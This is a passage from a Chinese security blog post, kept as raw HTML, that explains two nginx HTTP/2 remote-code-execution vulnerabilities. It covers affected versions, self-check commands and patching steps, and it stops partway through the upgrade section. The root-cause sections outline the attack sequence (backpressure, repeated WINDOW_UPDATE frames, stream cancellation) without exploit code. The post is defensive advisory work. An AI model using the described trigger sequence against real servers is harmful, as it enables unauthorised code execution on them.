@@ -1,0 +1,563 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633） | 剁椒鱼头没剁椒的博客</title><meta name="author" content="Doub1e007"><meta name="copyright" content="Doub1e007"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2026 年 11 月 18 日，F5 &#x2F; nginx.org 发布安全更新，修复了 9 个 nginx 漏洞，其中两个位于 HTTP&#x2F;2 实现、可导致未授权远程代码执行的问题最受关注：  CVE-2026-123007：HTTP&#x2F;2 连接级流控计数器下溢，造成堆越界读写，可 RCE CVE-2026-123633：HTTP&#x2F;2 连接关闭路径中的 use-a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 &#x2F; CVE-2026-123633）">
+<meta property="og:url" content="https://doub1e007.github.io/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/index.html">
+<meta property="og:site_name" content="剁椒鱼头没剁椒的博客">
+<meta property="og:description" content="2026 年 11 月 18 日，F5 &#x2F; nginx.org 发布安全更新，修复了 9 个 nginx 漏洞，其中两个位于 HTTP&#x2F;2 实现、可导致未授权远程代码执行的问题最受关注：  CVE-2026-123007：HTTP&#x2F;2 连接级流控计数器下溢，造成堆越界读写，可 RCE CVE-2026-123633：HTTP&#x2F;2 连接关闭路径中的 use-a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png">
+<meta property="article:published_time" content="2026-11-23T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-23T02:00:00.000Z">
+<meta property="article:author" content="Doub1e007">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="Nginx">
+<meta property="article:tag" content="HTTP&#x2F;2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）",
+  "url": "https://doub1e007.github.io/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/",
+  "image": "https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png",
+  "datePublished": "2026-11-23T02:00:00.000Z",
+  "dateModified": "2026-11-23T02:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Doub1e007",
+      "url": "https://doub1e007.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://doub1e007.github.io/2026/11/23/NGINX2Shell%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%8C%87%E5%8D%97/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><div class="aplayer no-destroy" data-id="6617202752" data-server="netease" data-type="playlist" data-api="https://api.injahow.cn/meting/?server=:server&type=:type&id=:id&r=:r" data-fixed="true" data-autoplay="true" data-lrcType="-1"> </div><link rel="alternate" href="/atom.xml" title="剁椒鱼头没剁椒的博客" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-graduation-cap"></i><span> Blog</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 豆瓣</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/book/"><i class="fa-fw fas fa-book"></i><span> 豆瓣图书</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 豆瓣电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">剁椒鱼头没剁椒的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-graduation-cap"></i><span> Blog</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 豆瓣</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/book/"><i class="fa-fw fas fa-book"></i><span> 豆瓣图书</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 豆瓣电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">nginx 也翻车了：9.2 分的 NGINX2Shell 漏洞到底有多严重？（CVE-2026-123007 / CVE-2026-123633）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-23T02:00:00.000Z" title="发表于 2026年11月23日 10:00:00">2026年11月23日</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-23T02:00:00.000Z" title="更新于 2026年11月23日 10:00:00">2026年11月23日</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:5,&quot;messagePrev&quot;:&quot;本文最后更新于&quot;,&quot;messageNext&quot;:&quot;天前，其中的信息可能已经有所发展或是发生改变。&quot;,&quot;postUpdate&quot;:&quot;2026-11-23T02:00:00.000Z&quot;}" hidden></div><p>2026 年 11 月 18 日，F5 &#x2F; nginx.org 发布安全更新，修复了 9 个 nginx 漏洞，其中两个位于 <strong>HTTP&#x2F;2 实现</strong>、可导致<strong>未授权远程代码执行</strong>的问题最受关注：</p>
+<ul>
+<li><strong>CVE-2026-123007</strong>：HTTP&#x2F;2 连接级流控计数器下溢，造成堆越界读写，可 RCE</li>
+<li><strong>CVE-2026-123633</strong>：HTTP&#x2F;2 连接关闭路径中的 use-after-free，可 RCE</li>
+</ul>
+<p>社区把这一组漏洞称为 <strong>NGINX2Root</strong>，把其中的 RCE 部分称为 <strong>NGINX2Shell</strong>。需要说明的是，这两个名字都不是官方命名：nginx 官方公告使用 CVE 编号，<code>nginx2shell</code> 是媒体和安全厂商的昵称；<code>nginx2root</code> 则额外假定了攻击者能再链上一个 Linux 本地提权漏洞。本文基于官方公告和公开研究整理，不包含利用代码，重点放在原理理解、影响判断和处置上。</p>
+<h2 id="一、事件速览"><a href="#一、事件速览" class="headerlink" title="一、事件速览"></a>一、事件速览</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>披露&#x2F;修复时间</td>
+<td>2026 年 11 月 18 日</td>
+</tr>
+<tr>
+<td>漏洞编号</td>
+<td>CVE-2026-123007、CVE-2026-123633（同批另有 7 个）</td>
+</tr>
+<tr>
+<td>漏洞类型</td>
+<td>整数下溢 &#x2F; 堆越界读写、use-after-free，均可导致 RCE</td>
+</tr>
+<tr>
+<td>严重等级</td>
+<td>CVSS v4.0 <strong>9.2（Critical）</strong>；CVSS v3.1 8.1（High）</td>
+</tr>
+<tr>
+<td>攻击前提</td>
+<td>目标启用 HTTP&#x2F;2 且攻击者可直接访问 nginx；无需认证、无需用户交互</td>
+</tr>
+<tr>
+<td>受影响组件</td>
+<td><code>ngx_http_v2_module</code>、HTTP&#x2F;2 连接管理</td>
+</tr>
+<tr>
+<td>修复版本</td>
+<td>nginx OSS <strong>1.30.7</strong>（stable）&#x2F; <strong>1.31.9</strong>（mainline）</td>
+</tr>
+<tr>
+<td>公开 PoC</td>
+<td>CVE-2026-123007 已有公开 PoC，但利用条件苛刻</td>
+</tr>
+<tr>
+<td>在野利用</td>
+<td>截至 11 月 19 日无确认的在野利用，未进入 CISA KEV</td>
+</tr>
+</tbody></table>
+<h2 id="二、先搞懂-HTTP-2-的流控"><a href="#二、先搞懂-HTTP-2-的流控" class="headerlink" title="二、先搞懂 HTTP&#x2F;2 的流控"></a>二、先搞懂 HTTP&#x2F;2 的流控</h2><p>HTTP&#x2F;2 用<strong>滑动窗口</strong>做流量控制，避免发送方把接收方的缓冲区打爆。这里有两个层级的窗口：</p>
+<ul>
+<li><strong>连接级窗口</strong>（connection flow-control window）：所有 stream 共享；</li>
+<li><strong>Stream 级窗口</strong>：每个 stream 各自独立。</li>
+</ul>
+<p>发送方每发送一个 <code>DATA</code> 帧，就从对应窗口里扣掉相应字节数；接收方处理完数据后，通过 <code>WINDOW_UPDATE</code> 帧把额度还回来。窗口的初始值默认是 65535 字节，上限是 <code>2^31 - 1</code>（0x7FFFFFFF）。</p>
+<p>问题就出在“还额度”这件事上：如果发送方对同一个 <code>DATA</code> 帧<strong>重复退款</strong>，窗口计数就会超过协议规定的上限，后续的边界检查又因为无符号运算回绕而失效。这正是 CVE-2026-123007 的核心。</p>
+<h2 id="三、CVE-2026-123007：流控计数器下溢"><a href="#三、CVE-2026-123007：流控计数器下溢" class="headerlink" title="三、CVE-2026-123007：流控计数器下溢"></a>三、CVE-2026-123007：流控计数器下溢</h2><h3 id="根因"><a href="#根因" class="headerlink" title="根因"></a>根因</h3><p>当 nginx 向客户端发送响应时，如果 TCP 出现背压（客户端接收慢、<code>send()</code> 无法写满），已经排队的 <code>DATA</code> 帧会暂时留在发送队列里。此时连接级窗口的额度<strong>已经扣过了</strong>，但数据还没真正发出去。</p>
+<p>攻击者的操作顺序大致是：</p>
+<ol>
+<li>制造背压，让 <code>DATA</code> 帧滞留在队列中；</li>
+<li>发送大量 <code>WINDOW_UPDATE</code>，把连接窗口重新抬高；</li>
+<li>通过 <code>RST_STREAM</code> 取消流，或修改 <code>SETTINGS_INITIAL_WINDOW_SIZE</code> 让请求提前结束。</li>
+</ol>
+<p>请求结束时会进入 <code>ngx_http_v2_filter_cleanup()</code> 清理逻辑。问题在于，清理函数会把<strong>仍在队列中、额度已经扣过一次</strong>的 <code>DATA</code> 帧再退款一次。一次请求里可能发生多次这样的“双重退款”，连接级 <code>send_window</code> 就被推过了 <code>0x7FFFFFFF</code>。</p>
+<p>接下来是第二步：nginx 对 <code>WINDOW_UPDATE</code> 的合法性检查本来是 <code>window &lt;= 2^31 - 1</code> 之类的边界判断，但当 <code>send_window</code> 已经超出上限时，右侧的表达式的值会变成负数，再按无符号数比较时发生回绕，检查反而通过了。攻击者可以借此把窗口值继续放大到 64 位地址空间的高半区。</p>
+<h3 id="从整数错误到内存破坏"><a href="#从整数错误到内存破坏" class="headerlink" title="从整数错误到内存破坏"></a>从整数错误到内存破坏</h3><p>窗口值最终在 TLS 输出路径中被强制转换成有符号的 <code>off_t</code>。一个本应巨大的无符号数变成了<strong>负数长度</strong>，<code>memcpy</code> &#x2F; <code>memmove</code> 的边界计算随之出错，形成大范围的堆越界读和越界写。表现出来的现象通常是 worker 进程崩溃（DoS），而在满足条件时可以被进一步利用为代码执行。</p>
+<p>按照公开分析，1.31.9 的修复方式是引入 <code>send_queued</code> 计数：退款时只能退“真实仍在队列中的额度”，并且只对 <code>DATA</code> 帧退款，从根上消除重复退款。</p>
+<h3 id="为什么这个洞藏了-11-年"><a href="#为什么这个洞藏了-11-年" class="headerlink" title="为什么这个洞藏了 11 年"></a>为什么这个洞藏了 11 年</h3><p>HTTP&#x2F;2 从 nginx 1.9.5（2015 年 9 月）开始支持，而这段流控记账逻辑长期没有大的改动。流控代码路径分支多、状态组合复杂，正常测试很难覆盖“背压 + 窗口更新 + 流取消”同时出现的时序，这类竞态型内存错误就容易长期潜伏。</p>
+<h2 id="四、CVE-2026-123633：连接复用标记导致的-UAF"><a href="#四、CVE-2026-123633：连接复用标记导致的-UAF" class="headerlink" title="四、CVE-2026-123633：连接复用标记导致的 UAF"></a>四、CVE-2026-123633：连接复用标记导致的 UAF</h2><p>第二个 RCE 的成因更“工程化”一些。</p>
+<p>nginx 在处理 HTTP&#x2F;2 连接时，会用 <code>ngx_reusable_connection(c, 1)</code> 把连接标记为“可复用”。当客户端只发送了部分 <code>HEADERS</code> 帧、请求尚未完成时，这个标记就已经被设置，而后续创建 stream 的路径<strong>没有清除它</strong>。</p>
+<p>在反向代理场景下，当 worker 的可用连接数紧张时，<code>drain_connections</code> 会尝试回收连接。它看到一个“可复用”的连接，就把它关掉并释放内存——但这条连接其实还在处理请求。后续代码继续访问已释放的连接对象，形成 use-after-free。</p>
+<p>这个漏洞主要影响<strong>反向代理</strong>配置，并且需要连接槽位紧张这一条件。修复只有一行：在创建 stream 时清除 reusable 标记。</p>
+<h2 id="五、同一批修复的其他漏洞"><a href="#五、同一批修复的其他漏洞" class="headerlink" title="五、同一批修复的其他漏洞"></a>五、同一批修复的其他漏洞</h2><p>1.31.9 &#x2F; 1.30.7 一共修复了 9 个问题，升级时应该一并处理：</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>问题</th>
+<th>影响场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2026-123634</td>
+<td>DNS resolver use-after-free</td>
+<td>同时使用 <code>resolver</code>、变量式 <code>proxy_pass</code>、<code>mirror</code>，且 <code>mirror_request_body off</code></td>
+</tr>
+<tr>
+<td>CVE-2026-121810</td>
+<td>HTTP&#x2F;3 连接关闭时 use-after-free</td>
+<td>启用 QUIC &#x2F; HTTP&#x2F;3</td>
+</tr>
+<tr>
+<td>CVE-2026-118899</td>
+<td>TLS 1.3 请求体无限循环</td>
+<td>启用 TLS 1.3，可造成 DoS</td>
+</tr>
+<tr>
+<td>CVE-2026-113425</td>
+<td>mail proxy <code>auth_http</code> use-after-free</td>
+<td>使用 mail 代理模块</td>
+</tr>
+<tr>
+<td>CVE-2026-120993</td>
+<td>PROXY protocol v2 NULL 解引用</td>
+<td>启用 PROXY protocol v2</td>
+</tr>
+<tr>
+<td>CVE-2026-125283</td>
+<td><code>alias</code> + <code>try_files</code> 缓冲区溢出</td>
+<td>使用 <code>alias</code> 与 <code>try_files</code> 组合</td>
+</tr>
+<tr>
+<td>CVE-2026-120967</td>
+<td>stream SNI 校验绕过</td>
+<td>stream 模块 SNI 路由</td>
+</tr>
+<tr>
+<td>CVE-2026-123640</td>
+<td>stream <code>ssl_preread</code> 校验问题</td>
+<td>stream + <code>ssl_preread</code></td>
+</tr>
+</tbody></table>
+<p>后两个属于校验绕过，未必直接 RCE，但在多租户、按 SNI 分流的环境里同样值得重视。</p>
+<h2 id="六、影响范围"><a href="#六、影响范围" class="headerlink" title="六、影响范围"></a>六、影响范围</h2><h3 id="nginx-开源版"><a href="#nginx-开源版" class="headerlink" title="nginx 开源版"></a>nginx 开源版</h3><table>
+<thead>
+<tr>
+<th>分支</th>
+<th>受影响版本</th>
+<th>修复版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>stable</td>
+<td>1.9.5 – 1.30.6</td>
+<td><strong>1.30.7</strong></td>
+</tr>
+<tr>
+<td>mainline</td>
+<td>1.31.0 – 1.31.8</td>
+<td><strong>1.31.9</strong></td>
+</tr>
+</tbody></table>
+<p>CVE-2026-123007 从 2015 年的 1.9.5 起就存在；CVE-2026-123633 则从 1.19.7 之后引入。也就是说，<strong>几乎所有支持 HTTP&#x2F;2 的 nginx 版本都在范围内</strong>。</p>
+<h3 id="NGINX-Plus"><a href="#NGINX-Plus" class="headerlink" title="NGINX Plus"></a>NGINX Plus</h3><p>F5 公告中，37.0.x 需升级到 37.0.8.1，37.1.x &#x2F; 37.2.x 需升级到 37.3.0.1 及以上；已 EOL 的 R33–R36 分支没有官方修复。具体以 F5 的 K000163926（-123007）和 K000163928（-123633）公告为准。</p>
+<h3 id="容易被忽略的“内嵌-nginx”"><a href="#容易被忽略的“内嵌-nginx”" class="headerlink" title="容易被忽略的“内嵌 nginx”"></a>容易被忽略的“内嵌 nginx”</h3><p>版本号不能只看 <code>nginx -v</code>。下面这些位置都可能带着有问题的 HTTP&#x2F;2 代码：</p>
+<ul>
+<li>Kubernetes Ingress Controller、Gateway Fabric 等 F5 自家产品；</li>
+<li>OpenResty、APISIX、Kong 等基于 nginx&#x2F;OpenResty 的网关；</li>
+<li>各类 WAF、负载均衡、CDN 回源组件中内嵌的 nginx；</li>
+<li>容器镜像、CI 构建产物、离线安装包。</li>
+</ul>
+<p>这些产品的版本号与上游 nginx 不是一一对应的，必须看厂商自己的安全公告，不能只拿 <code>1.30.7</code> 去比对。</p>
+<h2 id="七、自查：我的-nginx-真的受影响吗"><a href="#七、自查：我的-nginx-真的受影响吗" class="headerlink" title="七、自查：我的 nginx 真的受影响吗"></a>七、自查：我的 nginx 真的受影响吗</h2><p>漏洞利用有三个硬前提：<strong>版本在范围内、HTTP&#x2F;2 模块被编译进来、监听端口实际启用了 HTTP&#x2F;2</strong>。三者缺一不可。</p>
+<h3 id="1-查版本和模块"><a href="#1-查版本和模块" class="headerlink" title="1. 查版本和模块"></a>1. 查版本和模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br><span class="line">nginx -V 2&gt;&amp;1 | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | grep -E <span class="string">&#x27;nginx/|http_v2|http_v3&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>nginx -V</code> 的输出里如果没有 <code>--with-http_v2_module</code>，说明这个构建根本不支持 HTTP&#x2F;2，CVE-2026-123007 不适用于它（但版本本身仍应升级，因为同批还有别的洞）。</p>
+<h3 id="2-查配置里是否启用了-HTTP-2"><a href="#2-查配置里是否启用了-HTTP-2" class="headerlink" title="2. 查配置里是否启用了 HTTP&#x2F;2"></a>2. 查配置里是否启用了 HTTP&#x2F;2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nginx -T 2&gt;/dev/null | grep -nE <span class="string">&#x27;^\s*(listen|http2)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可能的写法有两种：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.25.0 及以前的旧写法</span></span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.25.1 以后的新写法</span></span><br><span class="line"><span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line"><span class="attribute">http2</span> <span class="literal">on</span>;</span><br></pre></td></tr></table></figure>
+
+<p>只要任意一个 server 块启用了 HTTP&#x2F;2，并且该端口对公网可达，就应该按受影响处理。</p>
+<h3 id="3-从外部确认是否协商了-h2"><a href="#3-从外部确认是否协商了-h2" class="headerlink" title="3. 从外部确认是否协商了 h2"></a>3. 从外部确认是否协商了 h2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect example.com:443 -servername example.com -alpn h2 &lt;/dev/null 2&gt;/dev/null \</span><br><span class="line">  | grep -E <span class="string">&#x27;ALPN protocol|Protocol&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出 <code>ALPN protocol: h2</code> 表示确实协商到了 HTTP&#x2F;2。注意要测<strong>源站地址</strong>，而不是 CDN 的边缘节点。</p>
+<h3 id="4-查包管理器、容器和所有实例"><a href="#4-查包管理器、容器和所有实例" class="headerlink" title="4. 查包管理器、容器和所有实例"></a>4. 查包管理器、容器和所有实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debian / Ubuntu</span></span><br><span class="line">dpkg -l | grep -E <span class="string">&#x27;^ii\s+nginx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RHEL / CentOS / Rocky</span></span><br><span class="line">rpm -qa | grep -E <span class="string">&#x27;^nginx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker</span></span><br><span class="line">docker ps --format <span class="string">&#x27;&#123;&#123;.Names&#125;&#125;\t&#123;&#123;.Image&#125;&#125;&#x27;</span></span><br><span class="line">docker <span class="built_in">exec</span> &lt;容器名&gt; nginx -v</span><br></pre></td></tr></table></figure>
+
+<p>别只看一台机器：负载均衡后面的多台源站、灰度环境、备份机、临时测试环境，都可能还跑着旧版本。</p>
+<h2 id="八、修复步骤"><a href="#八、修复步骤" class="headerlink" title="八、修复步骤"></a>八、修复步骤</h2><h3 id="第一步：升级"><a href="#第一步：升级" class="headerlink" title="第一步：升级"></a>第一步：升级</h3><p>优先使用发行版或官方软件源，等待厂商回移补丁；如果用的是官方源码包，直接升级到 1.30.7 &#x2F; 1.31.9。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debian / Ubuntu</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install --only-upgrade nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># RHEL 系</span></span><br><span class="line"><span class="built_in">sudo</span> dnf update nginx</span><br></pre></td></tr></table></figure>
+
+<p>源码编译时务必校验 PGP 签名，不要从第三方镜像随便下载：</p>
